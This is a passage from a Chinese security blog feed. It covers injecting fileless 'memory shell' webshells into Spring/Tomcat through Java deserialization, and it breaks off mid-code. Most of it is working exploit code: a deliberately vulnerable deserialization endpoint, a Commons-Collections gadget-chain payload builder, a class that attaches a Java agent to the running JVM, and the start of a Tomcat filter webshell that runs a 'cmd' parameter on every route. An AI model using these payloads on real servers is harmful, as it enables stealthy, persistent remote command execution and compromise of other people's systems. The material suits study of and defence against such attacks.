iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用测试-1"><a href="#利用测试-1" class="headerlink" title="利用测试"></a>利用测试</h4><p>启动springboot项目，将运行的base编码打到attack路由</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/34.png" class><p>根据控制台信息内存马已经注入成功，访问任何路由都能执行命令</p><img src="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/35.png" class><p>此刻已经完成Springboot的无文件内存马的实现。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>结合反序列化注入tomcat内存马</title>
      <link href="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前提概述"><a href="#0x01-前提概述" class="headerlink" title="0x01 前提概述"></a>0x01 前提概述</h2><p>通过前几个内存马的学习我们可以知道，将内存马写在jsp文件上传并不是传统意义上的内存马注入，jsp文件本质上就是一个servlet，servlet会编译成class文件，也会实现文件落地。借用木头师傅的一张图</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class><p>结合反序列化注入内存马是动态注入内存马的常用方法，然而通过反序列化注入的方式没有jsp文件的request内置类，所以获取回显的方式我们也需要考虑，在此写下这篇文章分析总结反序列化注入的方法细节。</p><h2 id="0x02-搭建反序列化环境"><a href="#0x02-搭建反序列化环境" class="headerlink" title="0x02 搭建反序列化环境"></a>0x02 搭建反序列化环境</h2><p>反序列化就用CC链来打，引入springboot和commons-collections还有javassist库的依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-autoconfigure<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写一个控制器类，实现一个反序列化入口的路由</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/attack&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">evalTest</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    byteArrayOutputStream.write(decode);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">    objectInputStream.readObject();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写springboot的启动程序</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.controller&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        SpringApplication.run(Application.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入反序列化的话需要类加载，而cc2，cc3和cc11最终都是通过类加载来执行恶意代码，在本篇文章中就用cc11来作例子，cc11的代码逻辑不在分析，可以先看看网上的分析文章。</p><p>最后贴上CC1的代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Field field;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\tmp\\classes\\test.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;1234&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evil&#125;);</span><br><span class="line"></span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), transformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(tmp, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt;hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        field = TiedMapEntry.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(hashMap);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;web.ser&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baor);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baor.toByteArray())));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out_obj1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ois</span> <span class="operator">=</span> obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-反序列化注入内存马分析"><a href="#0x03-反序列化注入内存马分析" class="headerlink" title="0x03 反序列化注入内存马分析"></a>0x03 反序列化注入内存马分析</h2><h3 id="注入Agent内存马"><a href="#注入Agent内存马" class="headerlink" title="注入Agent内存马"></a>注入Agent内存马</h3><p>注入Agent内存马需要加载Agent的jar包，通过 VirtualMachine 类启动后加载Agent.jar，需要满足两个前提操作</p><blockquote><p>VirtualMachine.attach方法获取正在运行的jvm的进程号</p><p>loadAgent 方法动态注册代理程序Agent</p></blockquote><p>利用反序列化打的时候对于像 VirtualMachine 的类不能直接new，获取一个 URLClassLoader 类加载器对VirtualMachine 类和 MyVirtualMachineDescriptor 进行类加载</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class<span class="comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br></pre></td></tr></table></figure><p>jvm运行的进程号不能直接通过Jps -l获取</p><p>VirtualMachine 类有一个list 方法，它的目的是列出当前系统中所有正在运行的 Java 虚拟机（JVM）进程的描述符</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class><p>用if条件判断当前运行的JVM，然后获取进程号，通过反射修改id属性，最后利用反射调用 loadAgent 方法动态注册Agent的jar包，最终的执行类为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;D:\\javaweb\\java\\java-agentShell\\java-agent\\out\\artifacts\\java_agent_jar\\java-agent.jar&quot;</span>;</span><br><span class="line">      <span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>, <span class="string">&quot;lib&quot;</span>) + File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">      <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">      <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; url &#125;);</span><br><span class="line">      Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">      Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">      <span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">      <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (List)listMethod.invoke(MyVirtualMachine, <span class="literal">null</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;Running JVM list ...&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)displayName.invoke(o, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (name.contains(<span class="string">&quot;Application&quot;</span>)) &#123;</span><br><span class="line">          <span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (String)getId.invoke(o, <span class="literal">null</span>);</span><br><span class="line">          System.out.println(<span class="string">&quot;id &gt;&gt;&gt; &quot;</span> + id);</span><br><span class="line">          <span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;);</span><br><span class="line">          <span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; id &#125;);</span><br><span class="line">          <span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;);</span><br><span class="line">          loadAgent.invoke(vm, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; path &#125;);</span><br><span class="line">          <span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">          detach.invoke(vm, <span class="literal">null</span>);</span><br><span class="line">          System.out.println(<span class="string">&quot;Agent.jar Inject Success !!&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在CC链中动态加载字节码，需要将恶意类继承 AbstractTranslet 接口</p><p>启动springboot程序，访问attack路由</p><p>将序列化的base64编码打进去</p><p>Agent代理是通过字节码修改Filter，添加恶意代码</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class><p>通过控制台日志可以看到已经修改成功了</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class><p>内存马注入成功</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class><p>任何路由都能获得命令回显。</p><h3 id="获取request和response注入内存马"><a href="#获取request和response注入内存马" class="headerlink" title="获取request和response注入内存马"></a>获取request和response注入内存马</h3><p>jsp文件中内置了 request 和 response 能够直接获取，可以在 response 写我们回显的内容。在通过反序列化注入的时候，我们需要通过一些手段获取到这两个类。</p><p>在ApplicationFilterChain类中定义了可以储存 request 和 response 的两个静态变量，分别为lastServicedRequest和lastServicedResponse</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class><p>全局搜索这两个变量，发现一处重要的代码逻辑</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class><p>如果 WRAP_SAME_OBJECT 是为true，lastServicedRequest 和 lastServicedResponse这两个静态变量就将request和response 放进去，在命令执行的时候就可以将执行结果写入回显中了。</p><p>首先修改 WRAP_SAME_OBJECT 属性，在 ApplicationDispatcher 类里</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class><p>final字段修饰，不可更改，首先通过反射将 final 字段移除，final 字段通常会存储在 java.lang.reflect.Field类中的modifiers字段，</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class><p>接着就是对lastServicedRequest 和 lastServicedResponse这两个字段初始化，初始化之后这两个字段就会储存Request和Response这两个对象，获取回显应该没太大问题。</p><p>剩下的就是动态注册Filter内存马了，Filter内存马之前分析过，在这篇文章就结合木头师傅文章里的EXP说一下流程</p><p>首先编写一个恶意的注入类，需要继承 AbstractTranslet 和 Filter 两大接口，前者是为了打CC链时能成功加载字节码，后者是为了动态注入一个恶意的Filter、</p><p>定义好参数以及路由</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class><p>接着获取 StandardContext 上下文，这是必须的，使用doFilter方法将我们自定义的过滤器添加进去</p><p>在这个方法里</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/12.png" class><p>this.context.getState() 在运行时返回的state已经是 LifecycleState.STARTED 了，所以直接就抛异常了，filter根本就添加不进去。我们可以在filter添加之前修改state为 LifecycleState.STARTING_PREP ，使其跳过if，添加完成后，再将state恢复成 LifecycleState.STARTED。对应修改的代码</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/13.png" class><p>filter添加完成后，需要执行 filterStart 方法初始化过滤器，执行的代码</p><img src="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/14.png" class><p>贴上完整的EXP</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshell命令参数名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;Xilitter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">            <span class="keyword">if</span> (servletContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> 